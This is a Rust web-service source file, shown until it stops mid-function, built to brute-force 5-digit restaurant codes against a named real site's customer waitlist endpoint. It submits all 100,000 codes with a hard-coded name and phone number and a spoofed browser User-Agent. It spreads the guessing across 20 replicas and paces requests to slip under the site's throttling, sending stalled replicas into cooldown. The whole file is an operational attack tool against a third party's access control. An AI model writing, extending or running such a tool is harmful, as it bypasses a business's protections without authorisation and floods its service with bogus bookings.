//! Brute-forces 5-digit restaurant codes against checktodine.com's waitlist
//! endpoint.
//!   - 100,000 codes (00000..99999) by default; GET /start accepts
//!     ?from= and ?to= to scan a sub-range instead. The range is half-open:
//!     from is inclusive, to is exclusive, both within 00000..99999
//!     (to may be 100000 to include 99999).
//!   - 5 concurrent in-flight requests (the site 409s anything much higher)
//!   - 10 retries with exponential backoff per code
//!   - Body sniff for "Restaurant Code is not valid." → not valid; anything
//!     else means we found a hit
//!   - First success short-circuits the rest of the scan via an atomic flag
//!   - Single-flight: exactly one scan runs at a time (409 if busy)
//!   - GET /stop requests the running scan to stop
//!   - GET / serves the UI; GET /status returns JSON run status including
//!     per-attempt outcome counters for debugging

use axum::extract::{rejection::QueryRejection, Query, State};
use axum::http::StatusCode;
use axum::response::{Html, IntoResponse, Json};
use axum::routing::{get, post};
use axum::Router;
use futures::stream::{self, StreamExt};
use governor::{Quota, RateLimiter};
use governor::state::{InMemoryState, NotKeyed};
use governor::clock::DefaultClock;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::VecDeque;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use std::num::NonZeroU32;
use tokio::sync::Mutex;

const TARGET_URL: &str = "https://checktodine.com/customer_waitlist.php?businessid=110";
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
/// Sustained request rate per replica. The site throttles bursty traffic,
/// so we pace with a token bucket instead of raw concurrency.
const RATE_PER_SEC: u32 = 100;
/// Number of worker tasks draining the buffer (high enough that the rate
/// limiter, not worker count, is the bottleneck).
const BUFFER_WORKERS: usize = 16;

// --- Orchestrator constants (isolated from worker logic) ---
/// How many codes to keep buffered per replica.
const ORCH_BUFFER_TARGET: usize = 500;
/// Refill a replica's buffer when it drops below this.
const ORCH_REFILL_THRESHOLD: usize = 200;
/// Seconds with no progress + non-empty buffer before a replica is stalled.
const ORCH_STALL_TIMEOUT_SECS: u64 = 120;
/// Cooldown for a stalled replica (suspected throttling).
const ORCH_COOLDOWN_SECS: u64 = 180;
/// Majority of replicas needed for the pre-start quorum check.
const ORCH_QUORUM: usize = 11;
const ORCH_REPLICA_COUNT: u32 = 20;

/// Base URL template for replicas. {i} is replaced with 1..=20.
fn replica_base() -> String {
    std::env::var("REPLICA_BASE")
        .unwrap_or_else(|_| "https://dosa-code-finder-{i}.billybishop4-workers.xyz".to_string())
}

fn replica_url(id: u32) -> String {
    replica_base().replace("{i}", &id.to_string())
}
const INVALID_MARKER: &str = "Restaurant Code is not valid.";
/// Exclusive upper bound for `to`: 100000 means "up to and including 99999".
const MAX_TO: u32 = 100_000;

/// Query params for GET /start. Both optional; omit them to scan everything.
/// Half-open range: from is inclusive, to is exclusive.
/// Example: /start?from=12000&to=13000 scans 12000..=12999.
#[derive(Deserialize)]
struct StartParams {
    from: Option<u32>,
    to: Option<u32>,
}

#[derive(Clone)]
struct AppState {
    client: Client,
    /// Single-flight slot: true while a scan owns it.
    is_running: Arc<AtomicBool>,
    code_found: Arc<AtomicBool>,
    stop_requested: Arc<AtomicBool>,
    tried: Arc<AtomicU64>,
    total: Arc<AtomicU64>,
    trial_code: Arc<Mutex<String>>,
    valid_code: Arc<Mutex<String>>,
    scan_range: Arc<Mutex<String>>,
    // Per-run attempt outcome counters (debugging).
    ok_200: Arc<AtomicU64>,
    http_4xx: Arc<AtomicU64>,
    http_5xx: Arc<AtomicU64>,
    timeouts: Arc<AtomicU64>,
    net_errors: Arc<AtomicU64>,
    last_error: Arc<Mutex<String>>,
    /// Buffered work orders (individual codes). Fed by POST /enqueue,
    /// drained by worker tasks through the rate limiter.
    buffer: Arc<Mutex<VecDeque<String>>>,
    /// Token bucket: steady RATE_PER_SEC requests, no bursts.
    limiter: Arc<RateLimiter<NotKeyed, InMemoryState, DefaultClock>>,
    // --- Orchestrator mode (isolated from worker logic above) ---
    /// True while this replica is acting as the orchestrator.
    orch_running: Arc<AtomicBool>,
    orch_found: Arc<AtomicBool>,
    orch_valid_code: Arc<Mutex<String>>,
    orch_message: Arc<Mutex<String>>,
    /// Central queue of codes to distribute.
    orch_queue: Arc<Mutex<VecDeque<String>>>,
    /// Per-replica orchestrator tracking.
    orch_replicas: Arc<Mutex<Vec<OrchReplica>>>,
    orch_from: Arc<AtomicU64>,
    orch_to: Arc<AtomicU64>,
    orch_started_at: Arc<Mutex<Option<std::time::SystemTime>>>,
}

/// Per-replica state tracked by the orchestrator.
#[derive(Clone)]
struct OrchReplica {
    id: u32,
    url: String,
    state: String, // "idle" | "working" | "cooldown"
    enqueued: Vec<String>,
    tried: u64,
    buffer_len: usize,
    rate: f64,
    last_poll_tried: u64,
    last_progress: std::time::Instant,
    fails: u32,
    last_error: String,
    cooldown_until: Option<std::time::Instant>,
}

#[derive(Serialize)]
struct Status {
    running: bool,
    range: String,
    tried: u64,
    total: u64,
    trial_code: String,
    valid_code: String,
    found: bool,
    ok_200: u64,
    http_4xx: u64,
    http_5xx: u64,
    timeouts: u64,
    net_errors: u64,
    last_error: String,
    buffer_len: usize,
    orchestrating: bool,
}

/// Releases the single-flight slot when the scan task ends, even on panic.
struct RunGuard {
    is_running: Arc<AtomicBool>,
}

impl Drop for RunGuard {
    fn drop(&mut self) {
        self.is_running.store(false, Ordering::SeqCst);
    }
}

async fn set_last_error(state: &AppState, msg: &str) {
    let short: String = msg.chars().take(160).collect();
    *state.last_error.lock().await = short;
}

/// POST one code attempt. Returns true iff the response body does NOT
/// contain the invalid marker — meaning the code was accepted.
/// Every attempt outcome is counted for debugging via /status.
async fn submit(state: AppState, code: String) -> bool {
    if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
        return false;
    }

    let form = [
        ("RestaurantCode", code.as_str()),
        ("WaitListName", "Hari"),
        ("WaitListPhone", "6504057400"),
        ("WaitListAdults", "1"),
        ("WaitListKids", ""),
        ("WaitListMessage", ""),
        ("SaveBooking", "  ＋ Add  "),
    ];

    let mut retries: u32 = 10;
    let mut wait_ms: u64 = 100;

    loop {
        if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
            return false;
        }
        let res = state
            .client
            .post(TARGET_URL)
            .header("User-Agent", USER_AGENT)
            .form(&form)
            .send()
            .await;

        match res {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    state.ok_200.fetch_add(1, Ordering::Relaxed);
                    match resp.text().await {
                        Ok(body) => {
                            let success = !body.contains(INVALID_MARKER);
                            {
                                let mut tc = state.trial_code.lock().await;
                                *tc = code.clone();
                            }
                            if success {
                                let mut vc = state.valid_code.lock().await;
                                *vc = code.clone();
                                state.code_found.store(true, Ordering::Relaxed);
                                println!("Found valid code: {code}");
                            }
                            return success;
                        }
                        Err(e) => {
                            state.net_errors.fetch_add(1, Ordering::Relaxed);
                            set_last_error(&state, &format!("body read failed: {e}")).await;
                        }
                    }
                } else {
                    if status.is_client_error() {
                        state.http_4xx.fetch_add(1, Ordering::Relaxed);
                    } else if status.is_server_error() {
                        state.http_5xx.fetch_add(1, Ordering::Relaxed);
                    } else {
                        state.net_errors.fetch_add(1, Ordering::Relaxed);
                    }
                    set_last_error(&state, &format!("HTTP {status}")).await;
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    state.timeouts.fetch_add(1, Ordering::Relaxed);
                } else {
                    state.net_errors.fetch_add(1, Ordering::Relaxed);
                }
                set_last_error(&state, &format!("request failed: {e}")).await;
            }
        }

        if retries == 0 {
            return false;
        }
        retries -= 1;
        tokio::time::sleep(Duration::from_millis(wait_ms)).await;
        wait_ms *= 2;
    }
}

/// Runs the scan. The caller must hold the single-flight slot: the RunGuard
/// created in start_handler is moved into the spawned task and releases the
/// slot when the task ends (even on panic).
/// Requests are paced through the token-bucket rate limiter (RATE_PER_SEC),
/// so the site sees a steady rate instead of a concurrency burst.
async fn try_all(state: AppState, from: u32, to: u32) {
    let total = (to - from) as u64;
    println!("starting scan of {total} codes ({from:05}..<{to:05}) at {RATE_PER_SEC}/sec");

    stream::iter(from..to)
        .map(|i| format!("{i:05}"))
        .for_each_concurrent(BUFFER_WORKERS, |code| {
            let st = state.clone();
            async move {
                // Wait for a rate-limiter permit (steady 100/sec, no burst).
                st.limiter.until_ready().await;
                let _ = submit(st.clone(), code).await;
                st.tried.fetch_add(1, Ordering::Relaxed);
            }
        })
        .await;

    let valid = state.valid_code.lock().await.clone();
    let found = state.code_found.load(Ordering::Relaxed);
    let tried = state.tried.load(Ordering::Relaxed);
    let stopped = state.stop_requested.load(Ordering::Relaxed);
    println!("scan finished. tried={tried}/{total} found={found} valid={valid} stopped={stopped}");
}

/// Checks a majority of replicas to ensure no scan is running.
/// Returns Ok(()) if a majority (≥11/20) respond and all report idle
/// (not running as worker, not orchestrating). Otherwise returns an error.
async fn check_majority_idle(client: &Client) -> Result<(), String> {
    use futures::stream::{self, StreamExt};

    let urls: Vec<String> = (1..=ORCH_REPLICA_COUNT).map(replica_url).collect();

    let results: Vec<Result<bool, ()>> = stream::iter(urls)
        .map(|url| {
            let c = client.clone();
            async move {
                let resp = c
                    .get(format!("{url}/status"))
                    .timeout(Duration::from_secs(10))
                    .send()
                    .await
                    .map_err(|_| ())?;
                let st: serde_json::Value = resp.json().await.map_err(|_| ())?;
                let running = st.get("running").and_then(|v| v.as_bool()).unwrap_or(false);
                let orchestrating = st.get("orchestrating").and_then(|v| v.as_bool()).unwrap_or(false);
                // Idle means: not running as worker AND not orchestrating.
                Ok(!(running || orchestrating))
            }
        })
        .buffer_unordered(20)
        .collect()
        .await;

    let mut idle_count = 0;
    let mut busy_count = 0;
    for r in results {
        match r {
            Ok(true) => idle_count += 1,
            Ok(false) => busy_count += 1,
            Err(()) => {} // Unreachable doesn't count toward quorum.
        }
    }

    if busy_count > 0 {
        return Err(format!(
            "{busy_count} replica(s) report an active scan; only one orchestrator may run"
        ));
    }
    if idle_count < ORCH_QUORUM {
        return Err(format!(
            "only {idle_count}/20 replicas confirmed idle, need majority ({ORCH_QUORUM})"
        ));
    }
    Ok(())
}

/// Orchestrator: feeds buffers to worker replicas and monitors progress.
/// Runs as a background task while `orch_running` is true.
async fn orchestrator_task(state: AppState, from: u32, to: u32, n_replicas: u32) {
    println!("orchestrator: starting {from:05}..{to:05} over {n_replicas} replicas");

    // Initialize central queue.
    {
        let mut q = state.orch_queue.lock().await;
        q.clear();
        for i in from..to {
            q.push_back(format!("{i:05}"));
        }
    }
    state.orch_from.store(from as u64, Ordering::SeqCst);
    state.orch_to.store(to as u64, Ordering::SeqCst);
    *state.orch_started_at.lock().await = Some(std::time::SystemTime::now());

    // Initialize replica tracking.
    {
        let mut reps = state.orch_replicas.lock().await;
        reps.clear();
        for i in 1..=n_replicas {
            reps.push(OrchReplica {
                id: i,
                url: replica_url(i),
                state: "idle".to_string(),
                enqueued: Vec::new(),
                tried: 0,
                buffer_len: 0,
                rate: 0.0,
                last_poll_tried: 0,
                last_progress: std::time::Instant::now(),
                fails: 0,
                last_error: String::new(),
                cooldown_until: None,
            });
        }
    }

    // Initial fill + start for each replica.
    for i in 1..=n_replicas {
        if !state.orch_running.load(Ordering::SeqCst) {
            break;
        }
        let rep_url;
        {
            let reps = state.orch_replicas.lock().await;
            rep_url = reps[(i - 1) as usize].url.clone();
        }
        // Stop any stale scan first.
        let _ = state.client.get(format!("{rep_url}/stop")).send().await;
        tokio::time::sleep(Duration::from_millis(300)).await;

        // Fill buffer.
        if let Err(e) = orch_refill(&state, i).await {
            println!("orchestrator: initial fill failed for replica {i}: {e}");
            continue;
        }
        // Start buffered scan.
        match state.client.get(format!("{rep_url}/start-buffered")).send().await {
            Ok(resp) => {
                if resp.status().is_success() {
                    let mut reps = state.orch_replicas.lock().await;
                    if let Some(r) = reps.iter_mut().find(|r| r.id == i) {
                        r.state = "working".to_string();
                        r.last_progress = std::time::Instant::now();
                    }
                } else {
                    println!("orchestrator: start-buffered failed for replica {i}: {}", resp.status());
                }
            }
            Err(e) => {
                println!("orchestrator: start-buffered error for replica {i}: {e}");
            }
        }
    }

    // Main poll loop.
    while state.orch_running.load(Ordering::SeqCst) {
        if state.orch_found.load(Ordering::SeqCst) {
            break;
        }

        // Expire cooldowns and restart idle replicas if work remains.
        {
            let mut reps = state.orch_replicas.lock().await;
            let q_empty = state.orch_queue.lock().await.is_empty();
            for r in reps.iter_mut() {
                if r.state == "cooldown" {
                    if let Some(until) = r.cooldown_until {
                        if std::time::Instant::now() >= until {
                            r.state = "idle".to_string();
                            r.last_error.clear();
                        }
                    }
                }
            }
            // Collect idle replicas that need restart (drop lock first).
            let _ = q_empty;
        }

        // Poll each replica.
        let rep_ids: Vec<u32> = {
            let reps = state.orch_replicas.lock().await;
            reps.iter().map(|r| r.id).collect()
        };
        for rid in rep_ids {
            if !state.orch_running.load(Ordering::SeqCst) {
                break;
            }
            orch_poll_replica(&state, rid).await;
            if state.orch_found.load(Ordering::SeqCst) {
                break;
            }
        }

        // Check completion: queue empty and all buffers drained.
        {
            let q_empty = state.orch_queue.lock().await.is_empty();
            if q_empty {
                let mut reps = state.orch_replicas.lock().await;
                let all_drained = reps.iter().all(|r| r.buffer_len == 0);
                if all_drained {
                    // Stop all workers and mark idle.
                    let urls: Vec<String> = reps.iter().map(|r| r.url.clone()).collect();
                    for r in reps.iter_mut() {
                        r.state = "idle".to_string();
                    }
                    drop(reps);
                    for url in urls {
                        let c = state.client.clone();
                        tokio::spawn(async move {
                            let _ = c.get(format!("{url}/stop")).send().await;
                        });
                    }
                    *state.orch_message.lock().await = "scan complete, no code found".to_string();
                    state.orch_running.store(false, Ordering::SeqCst);
                    break;
                }
            }
        }

        tokio::time::sleep(Duration::from_secs(2)).await;
    }

    println!("orchestrator: task ended");
}

/// Refills a replica's buffer to ORCH_BUFFER_TARGET from the central queue.
async fn orch_refill(state: &AppState, rid: u32) -> Result<usize, String> {
    // Determine how many codes are needed.
    let need: usize;
    {
        let reps = state.orch_replicas.lock().await;
        let r = reps.iter().find(|r| r.id == rid).ok_or("replica not found")?;
        if r.buffer_len >= ORCH_BUFFER_TARGET {
            return Ok(0);
        }
        need = ORCH_BUFFER_TARGET - r.buffer_len;
    }

    // Take codes from central queue.
    let mut codes = Vec::new();
    {
        let mut q = state.orch_queue.lock().await;
        while codes.len() < need {
            match q.pop_front() {
                Some(c) => codes.push(c),
                None => break,
            }
        }
    }
    if codes.is_empty() {
        return Ok(0);
    }

    // POST /enqueue.
    let url;
    {
        let reps = state.orch_replicas.lock().await;
        url = reps.iter().find(|r| r.id == rid).map(|r| r.url.clone()).ok_or("replica not found")?;
    }
    let n = codes.len();
    let resp = state
        .client
        .post(format!("{url}/enqueue"))
        .json(&serde_json::json!({ "codes": codes.clone() }))
        .send()
        .await
        .map_err(|e| format!("enqueue failed: {e}"))?;

    if !resp.status().is_success() {
        // Put codes back.
        let mut q = state.orch_queue.lock().await;
        for c in codes.into_iter().rev() {
            q.push_front(c);
        }
        return Err(format!("enqueue HTTP {}", resp.status()));
    }

    let body: serde_json::Value = resp.json().await.map_err(|e| format!("bad enqueue response: {e}"))?;
    let buffer_len = body.get("buffer_len").and_then(|v| v.as_u64()).unwrap_or(0) as usize;

    {
        let mut reps = state.orch_replicas.lock().await;
        if let Some(r) = reps.iter_mut().find(|r| r.id == rid) {
            r.enqueued.extend(codes);
            r.buffer_len = buffer_len;
        }
    }
    Ok(n)
}

/// Polls a single replica, updates tracking, refills if low, detects stalls.
async fn orch_poll_replica(state: &AppState, rid: u32) {
    let (url, rep_state);
    {
        let reps = state.orch_replicas.lock().await;
        match reps.iter().find(|r| r.id == rid) {
            Some(r) => {
                if r.state != "working" {
                    return;
                }
                url = r.url.clone();
                rep_state = r.state.clone();
            }
            None => return,
        }
    }
    let _ = rep_state;

    // GET /status.
    let st: serde_json::Value = match state
        .client
        .get(format!("{url}/status"))
        .timeout(Duration::from_secs(10))
        .send()
        .await
    {
        Ok(resp) => match resp.json().await {
            Ok(v) => v,
            Err(_) => {
                orch_rep_fail(state, rid, "bad status JSON").await;
                return;
            }
        },
        Err(e) => {
            orch_rep_fail(state, rid, &format!("status failed: {e}")).await;
            return;
        }
    };

    let tried = st.get("tried").and_then(|v| v.as_u64()).unwrap_or(0);
    let buffer_len = st.get("buffer_len").and_then(|v| v.as_u64()).unwrap_or(0) as usize;
    let found = st.get("found").and_then(|v| v.as_bool()).unwrap_or(false);
    let valid_code = st
        .get("valid_code")
        .and_then(|v| v.as_str())
        .unwrap_or("—")
        .to_string();

    // Check for found code.
    if found && valid_code != "—" && !valid_code.is_empty() {
        println!("orchestrator: code {valid_code} found by replica {rid}");
        state.orch_found.store(true, Ordering::SeqCst);
        *state.orch_valid_code.lock().await = valid_code.clone();
        *state.orch_message.lock().await = format!("code {valid_code} found by replica {rid}");
        // Log to history would go here (orchestrator history).
        state.orch_running.store(false, Ordering::SeqCst);

        // Stop all replicas.
        let urls: Vec<String> = {
            let reps = state.orch_replicas.lock().await;
            reps.iter().map(|r| r.url.clone()).collect()
        };
        for u in urls {
            let c = state.client.clone();
            tokio::spawn(async move {
                let _ = c.get(format!("{u}/stop")).send().await;
            });
        }
        return;
    }

    // Update tracking.
    {
        let mut reps = state.orch_replicas.lock().await;
        if let Some(r) = reps.iter_mut().find(|r| r.id == rid) {
            // Rate (simple EWMA).
            let now = std::time::Instant::now();
            let dt = now.duration_since(r.last_progress).as_secs_f64();
            // Use tried delta for rate; approximate.
            if tried > r.last_poll_tried && dt > 0.5 {
                let instant = (tried - r.last_poll_tried) as f64 / 2.0; // ~2s poll interval
                r.rate = if r.rate == 0.0 { instant } else { 0.7 * r.rate + 0.3 * instant };
            }
            if tried > r.last_poll_tried {
                r.last_progress = now;
            }
            r.last_poll_tried = tried;
            r.tried = tried;
            r.buffer_len = buffer_len;
            r.fails = 0;

            // Stall detection.
            let idle_for = now.duration_since(r.last_progress).as_secs();
            if buffer_len > 0 && idle_for > ORCH_STALL_TIMEOUT_SECS {
                println!("orchestrator: replica {rid} stalled, requeuing");
                // Requeue unprocessed: enqueued[tried..]
                let unprocessed: Vec<String> = if (tried as usize) < r.enqueued.len() {
                    r.enqueued[(tried as usize)..].to_vec()
                } else {
                    Vec::new()
                };
                let n = unprocessed.len();
                drop(reps);
                {
                    let mut q = state.orch_queue.lock().await;
                    for c in unprocessed.into_iter().rev() {
                        q.push_front(c);
                    }
                }
                {
                    let mut reps = state.orch_replicas.lock().await;
                    if let Some(r) = reps.iter_mut().find(|r| r.id == rid) {
                        r.enqueued.clear();
                        r.tried = 0;
                        r.buffer_len = 0;
                        r.state = "cooldown".to_string();
                        r.cooldown_until = Some(now + Duration::from_secs(ORCH_COOLDOWN_SECS));
                        r.last_error = format!("stall, requeued {n}");
                    }
                }
                // Stop the stalled replica.
                let c = state.client.clone();
                let u = url.clone();
                tokio::spawn(async move {
                    let _ = c.get(format!("{u}/stop")).send().await;
                });
                return;
            }
        }
    }

    // Refill if low.
    if buffer_len < ORCH_REFILL_THRESHOLD {
        let _ = orch_refill(state, rid).await;
    }
}

/// Handles a replica poll failure.
async fn orch_rep_fail(state: &AppState, rid: u32, msg: &str) {
    let mut reps = state.orch_replicas.lock().await;
    if let Some(r) = reps.iter_mut().find(|r| r.id == rid) {
        r.fails += 1;
        r.last_error = msg.chars().take(120).collect();
        if r.fails >= 3 {
            // Requeue unprocessed.
            let tried = r.tried as usize;
            let unprocessed: Vec<String> = if tried < r.enqueued.len() {
                r.enqueued[tried..].to_vec()
            } else {
                Vec::new()
            };
            let n = unprocessed.len();
            let r_state = r.state.clone();
            drop(reps);
            if r_state == "working" {
                let mut q = state.orch_queue.lock().await;
                for c in unprocessed.into_iter().rev() {
                    q.push_front(c);
                }
            }
            {
                let mut reps = state.orch_replicas.lock().await;
                if let Some(r) = reps.iter_mut().find(|r| r.id == rid) {
                    r.enqueued.clear();
                    r.tried = 0;
                    r.buffer_len = 0;
                    r.state = "cooldown".to_string();
                    r.cooldown_until = Some(std::time::Instant::now() + Duration::from_secs(ORCH_COOLDOWN_SECS));
                    r.last_error = format!("unreachable, requeued {n}");
                }
            }
        }
    }
}

/// Drains the shared buffer through the rate limiter. Multiple workers run
/// concurrently; the limiter (not worker count) sets the pace.
async fn drain_buffer(state: AppState) {
    loop {
        if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
            break;
        }
        let code: Option<String> = {
            let mut buf = state.buffer.lock().await;
            buf.pop_front()
        };
        match code {
            Some(c) => {
                state.limiter.until_ready().await;
                // Re-check stop after waiting for the permit.
                if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
                    // Put it back; someone else may resume.
                    let mut buf = state.buffer.lock().await;
                    buf.push_front(c);
                    break;
                }
                let _ = submit(state.clone(), c).await;
                state.tried.fetch_add(1, Ordering::Relaxed);
            }
            None => {
                // Buffer empty: idle briefly, then check again (or exit if stopped).
                tokio::time::sleep(Duration::from_millis(200)).await;
            }
        }
    }
}

async fn status_handler(State(state): State<AppState>) -> Json<Status> {
    Json(Status {
        running: state.is_running.load(Ordering::SeqCst),
        range: state.scan_range.lock().await.clone(),
        tried: state.tried.load(Ordering::Relaxed),
        total: state.total.load(Ordering::Relaxed),
        trial_code: state.trial_code.lock().await.clone(),
        valid_code: state.valid_code.lock().await.clone(),
        found: state.code_found.load(Ordering::Relaxed),
        ok_200: state.ok_200.load(Ordering::Relaxed),
        http_4xx: state.http_4xx.load(Ordering::Relaxed),
        http_5xx: state.http_5xx.load(Ordering::Relaxed),
        timeouts: state.timeouts.load(Ordering::Relaxed),
        net_errors: state.net_errors.load(Ordering::Relaxed),
        last_error: state.last_error.lock().await.clone(),
        buffer_len: state.buffer.lock().await.len(),
        orchestrating: state.orch_running.load(Ordering::SeqCst),
    })
}

#[derive(Deserialize)]
struct EnqueueBody {
    codes: Vec<String>,
}

/// POST /enqueue {"codes": ["00001", ...]} — appends work orders to the
/// replica's buffer. The buffer is drained by workers through the rate
/// limiter once a buffered scan is started.
async fn enqueue_handler(
    State(state): State<AppState>,
    Json(body): Json<EnqueueBody>,
) -> impl IntoResponse {
    let n = body.codes.len();
    {
        let mut buf = state.buffer.lock().await;
        buf.extend(body.codes);
    }
    let len = state.buffer.lock().await.len();
    (
        StatusCode::OK,
        Json(json!({"ok": true, "enqueued": n, "buffer_len": len})),
    )
}

/// GET /start-buffered — starts draining the buffer through the rate limiter.
/// Single-flight like /start.
async fn start_buffered_handler(State(state): State<AppState>) -> impl IntoResponse {
    if state.is_running.swap(true, Ordering::SeqCst) {
        return (
            StatusCode::CONFLICT,
            Json(json!({"ok": false, "error": "a scan is already running"})),
        );
    }
    let guard = RunGuard {
        is_running: state.is_running.clone(),
    };
    // Fresh per-run state; total is unknown upfront in buffer mode (0 = streaming).
    reset_run_state(&state, 0, 0).await;
    {
        let mut sr = state.scan_range.lock().await;
        *sr = "buffered".to_string();
    }

    tokio::spawn(async move {
        let _guard = guard;
        let mut workers = Vec::with_capacity(BUFFER_WORKERS);
        for _ in 0..BUFFER_WORKERS {
            let st = state.clone();
            workers.push(tokio::spawn(async move {
                drain_buffer(st).await;
            }));
        }
        for w in workers {
            let _ = w.await;
        }
        let valid = state.valid_code.lock().await.clone();
        let found = state.code_found.load(Ordering::Relaxed);
        let tried = state.tried.load(Ordering::Relaxed);
        println!("buffered scan finished. tried={tried} found={found} valid={valid}");
    });
    (
        StatusCode::OK,
        Json(json!({"ok": true, "message": "buffered scan started"})),
    )
}

async fn reset_run_state(state: &AppState, from: u32, to: u32) {
    state.code_found.store(false, Ordering::Relaxed);
    state.stop_requested.store(false, Ordering::Relaxed);
    state.tried.store(0, Ordering::Relaxed);
    state.total.store((to - from) as u64, Ordering::Relaxed);
    state.ok_200.store(0, Ordering::Relaxed);
    state.http_4xx.store(0, Ordering::Relaxed);
    state.http_5xx.store(0, Ordering::Relaxed);
    state.timeouts.store(0, Ordering::Relaxed);
    state.net_errors.store(0, Ordering::Relaxed);
    *state.trial_code.lock().await = "—".to_string();
    *state.valid_code.lock().await = "—".to_string();
    *state.scan_range.lock().await = format!("{from:05}..{to:05}");
    *state.last_error.lock().await = "—".to_string();
}

async fn start_handler(
    State(state): State<AppState>,
    query: Result<Query<StartParams>, QueryRejection>,
) -> impl IntoResponse {
    // Map extractor-level rejections (e.g. ?from=abc) into our JSON error shape.
    let params = match query {
        Ok(Query(p)) => p,
        Err(e) => {
            return (
                StatusCode::BAD_REQUEST,
                Json(json!({"ok": false, "error": format!("bad query: {e}")})),
            )
        }
    };
    let from = params.from.unwrap_or(0);
    let to = params.to.unwrap_or(MAX_TO);
    if from >= to || to > MAX_TO {
        return (
            StatusCode::BAD_REQUEST,
            Json(json!({"ok": false, "error": "bad range: need 0 <= from < to <= 100000 (from inclusive, to exclusive)"})),
        );
    }
    // Atomic single-flight reservation: exactly one scan runs at a time.
    if state.is_running.swap(true, Ordering::SeqCst) {
        return (
            StatusCode::CONFLICT,
            Json(json!({"ok": false, "error": "a scan is already running"})),
        );
    }
    // Hold the guard from acquisition: if this handler future is dropped
    // before the scan task spawns (client disconnect), the slot is released.
    let guard = RunGuard {
        is_running: state.is_running.clone(),
    };
    // Fresh per-run state.
    reset_run_state(&state, from, to).await;

    tokio::spawn(async move {
        let _guard = guard;
        try_all(state, from, to).await;
    });
    (
        StatusCode::OK,
        Json(json!({"ok": true, "message": format!("started {from:05}..{to:05}")})),
    )
}

async fn stop_handler(State(state): State<AppState>) -> impl IntoResponse {
    if !state.is_running.load(Ordering::SeqCst) {
        return (
            StatusCode::OK,
            Json(json!({"ok": true, "message": "no scan running"})),
        );
    }
    state.stop_requested.store(true, Ordering::SeqCst);
    (
        StatusCode::OK,
        Json(json!({"ok": true, "message": "stop requested; the scan will drain shortly"})),
    )
}

// --- Orchestrator endpoints (isolated from worker endpoints above) ---

#[derive(Deserialize)]
struct OrchStartParams {
    from: Option<u32>,
    to: Option<u32>,
    replicas: Option<u32>,
}

#[derive(Serialize)]
struct OrchStatus {
    running: bool,
    found: bool,
    valid_code: String,
    message: String,
    range: String,
    tried: u64,
    total: u64,
    queued: usize,
    replicas: Vec<OrchReplicaStatus>,
}

#[derive(Serialize)]
struct OrchReplicaStatus {
    id: u32,
    state: String,
    tried: u64,
    buffer_len: usize,
    rate: f64,
    last_error: String,
}

/// GET /orchestrate/start?from=&to=&replicas= — starts orchestrating.
///
/// Before starting, checks a majority of replicas (≥11/20) to ensure no
/// scan is running. Returns 409 if another scan is active or quorum fails.
async fn orch_start_handler(
    State(state): State<AppState>,
    query: Result<Query<OrchStartParams>, QueryRejection>,
) -> impl IntoResponse {
    let params = match query {
        Ok(Query(p)) => p,
        Err(e) => {
            return (
                StatusCode::BAD_REQUEST,
                Json(json!({"ok": false, "error": format!("bad query: {e}")})),
            )
        }
    };
    let from = params.from.unwrap_or(0);
    let to = params.to.unwrap_or(100_000);
    let n = params.replicas.unwrap_or(20).clamp(1, ORCH_REPLICA_COUNT);
    if from >= to || to > 100_000 {
        return (
            StatusCode::BAD_REQUEST,
            Json(json!({"ok": false, "error": "need 0 <= from < to <= 100000"})),
        );
    }

    // Single orchestrator: refuse if this replica is already orchestrating
    // or running as a worker.
    if state.orch_running.load(Ordering::SeqCst) {
        return (
            StatusCode::CONFLICT,
            Json(json!({"ok": false, "error": "this replica is already orchestrating"})),
        );
    }
    if state.is_running.load(Ordering::SeqCst) {
        return (
            StatusCode::CONFLICT,
            Json(json!({"ok": false, "error": "this replica is running as a worker; stop it first"})),
        );
    }

    // Majority check: ensure no other scan is running.
    match check_majority_idle(&state.client).await {
        Ok(()) => {},
        Err(e) => {
            return (
                StatusCode::CONFLICT,
                Json(json!({"ok": false, "error": e})),
            )
        }
    }

    // Claim orchestration.
    state.orch_running.store(true, Ordering::SeqCst);
    state.orch_found.store(false, Ordering::SeqCst);
    *state.orch_valid_code.lock().await = "—".to_string();
    *state.orch_message.lock().await = String::new();

    let st = state.clone();
    tokio::spawn(async move {
        orchestrator_task(st, from, to, n).await;
    });

    let msg = format!("orchestrating {from:05}..{to:05} over {n} replicas");
    (StatusCode::OK, Json(json!({"ok": true, "message": msg})))
}

/// GET /orchestrate/stop — stops the orchestrator and all workers.
async fn orch_stop_handler(State(state): State<AppState>) -> impl IntoResponse {
    if !state.orch_running.load(Ordering::SeqCst) {
        return (
            StatusCode::OK,
            Json(json!({"ok": true, "message": "not orchestrating"})),
        );
    }
    state.orch_running.store(false, Ordering::SeqCst);
    *state.orch_message.lock().await = "stopped by user".to_string();

    // Stop all workers.
    let urls: Vec<String> = {
        let reps = state.orch_replicas.lock().await;
        reps.iter().map(|r| r.url.clone()).collect()
    };
    let client = state.client.clone();
    tokio::spawn(async move {
        for url in urls {
            let c = client.clone();
            let _ = c.get(format!("{url}/stop")).send().await;
        }
    });

    (
        StatusCode::OK,
        Json(json!({"ok": true, "message": "orchestrator stop requested"})),
    )
}

/// GET /orchestrate/status — orchestrator status.
async fn orch_status_handler(State(state): State<AppState>) -> Json<OrchStatus> {
    let reps = state.orch_replicas.lock().await;
    let tried: u64 = reps.iter().map(|r| r.tried).sum();
    let total = (state.orch_to.load(Ordering::SeqCst) - state.orch_from.load(Ordering::SeqCst)) as u64;
    let queued = state.orch_queue.lock().await.len();
    let rep_status: Vec<OrchReplicaStatus> = reps
        .iter()
        .map(|r| OrchReplicaStatus {
            id: r.id,
            state: r.state.clone(),
            tried: r.tried,
            buffer_len: r.buffer_len,
            rate: (r.rate * 10.0).round() / 10.0,
            last_error: r.last_error.clone(),
        })
        .collect();
